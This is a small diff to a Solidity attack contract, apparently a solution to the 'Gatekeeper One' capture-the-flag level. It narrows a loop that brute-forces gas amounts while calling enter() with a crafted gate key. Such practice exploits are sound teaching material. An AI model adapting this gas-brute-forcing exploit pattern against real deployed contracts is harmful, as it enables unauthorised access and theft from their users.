@@ -12,7 +12,7 @@ contract AttackGatekeeperOne {
 
     function attack() public {
         bytes8 _gateKey = 0x46f938660000f33a;
-        for (uint256 i = 0; i < 300; i++) {
+        for (uint256 i = 250; i < 280; i++) {
             (bool success,) =
                 address(gatekeeperone).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
             if (success) {
